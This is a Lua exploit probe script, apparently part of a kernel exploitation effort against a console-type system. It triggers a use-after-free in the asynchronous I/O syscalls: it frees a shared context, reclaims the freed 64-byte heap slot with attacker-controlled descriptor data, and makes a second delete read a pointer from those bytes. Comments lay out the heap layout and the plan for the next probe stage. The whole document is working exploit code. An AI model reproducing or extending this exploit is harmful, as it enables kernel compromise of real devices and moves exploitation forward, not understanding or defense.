-- CRASH_CLASS: HIGH
-- PROBE 504b: free the shared context with item 0, refill its 64-byte slot with a
-- descriptor array we control (aio create mallocs count*0x28 first), then let
-- item 1's delete read [C+0x10] out of OUR bytes.
--
-- 13.60 create order in the 64-byte malloc zone: D = malloc(count*0x28) first,
-- then T = malloc(0x30), then C = malloc(0x30). Delete takes C=[W+0x18],
-- calls 0x8ac69670([C+0x10]) (a refcount release) and frees C. With the context
-- already freed by item 0, item 1 re-reads the same pointer; if D landed there,
-- [D+0x10] is ours.  In this run [D+0x10] = 0 so the release is skipped and the
-- probe should complete; 504c will put a marker there.

print("=== PROBE 504b: aio reclaim shared context ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local sc_c, sc_p, sc_d = make_syscall(669), make_syscall(664), make_syscall(662)
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end
    return nil
end
local function wr(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function fill(page, val, n)
    for o = 0, (n or 0x1000) - 4, 4 do wr(page + o, val) end
end

local DATA = memory.alloc(0x1000)
local DESC = memory.alloc(0x1000)
local OUT  = memory.alloc(0x1000)
local IDS  = memory.alloc(0x1000)
local RES  = memory.alloc(0x1000)
fill(DATA, 0)
fill(DESC, 0x42424242)
wq(DESC + 0x10, 0)          -- [D+0x10] = 0: release skipped if D lands on C
wq(DESC + 0x18, 0)
wq(DESC + 0x20, 0)

local N = 4
local function one_id(base, i) return base + i * 0x10000 end

wr(OUT, 0)
local okc, retc = pcall(function() return sc_c(0x1001, DATA, N, 1, OUT) end)
local base = rd(OUT)
print(string.format("A create count=%d ok=%s ret=%d base=%d", N, tostring(okc), to_num(retc), base))
if base == 0 then print("=== DONE ===") return end
for i = 0, N - 1 do
    wr(IDS, one_id(base, i)); fill(RES, 0x77777777, 4)
    local ok, r = pcall(function() return sc_p(IDS, 1, RES) end)
    print(string.format("  poll %d ok=%s ret=%d st=%08x", i, tostring(ok), to_num(r), rd(RES)))
end

wr(IDS, one_id(base, 0)); fill(RES, 0x77777777, 4)
local ok0, r0 = pcall(function() return sc_d(IDS, 1, RES) end)
print(string.format("B delete item0 ok=%s ret=%d st=%08x  (context freed)", tostring(ok0), to_num(r0), rd(RES)))

wr(OUT, 0)
local ok2, ret2 = pcall(function() return sc_c(1, DESC, 1, 1, OUT) end)
local id2 = rd(OUT)
print(string.format("C create filler id=%d ok=%s ret=%d  (D should reuse the freed slot)", id2, tostring(ok2), to_num(ret2)))

wr(IDS, one_id(base, 1)); fill(RES, 0x77777777, 4)
local ok1, r1 = pcall(function() return sc_d(IDS, 1, RES) end)
print(string.format("D delete item1 ok=%s ret=%d st=%08x  (reads [C+0x10] from reused bytes)", tostring(ok1), to_num(r1), rd(RES)))

if id2 ~= 0 then
    wr(IDS, id2); fill(RES, 0x77777777, 4)
    local okp, rp = pcall(function() return sc_p(IDS, 1, RES) end)
    print(string.format("E poll filler ok=%s ret=%d st=%08x", tostring(okp), to_num(rp), rd(RES)))
    fill(RES, 0x77777777, 4)
    local okd, rd2 = pcall(function() return sc_d(IDS, 1, RES) end)
    print(string.format("F delete filler ok=%s ret=%d st=%08x", tostring(okd), to_num(rd2), rd(RES)))
end

for i = 2, N - 1 do
    wr(IDS, one_id(base, i)); fill(RES, 0x77777777, 4)
    local ok, r = pcall(function() return sc_d(IDS, 1, RES) end)
    print(string.format("G delete item%d ok=%s ret=%d st=%08x", i, tostring(ok), to_num(r), rd(RES)))
end
print("=== DONE (no crash) ===")
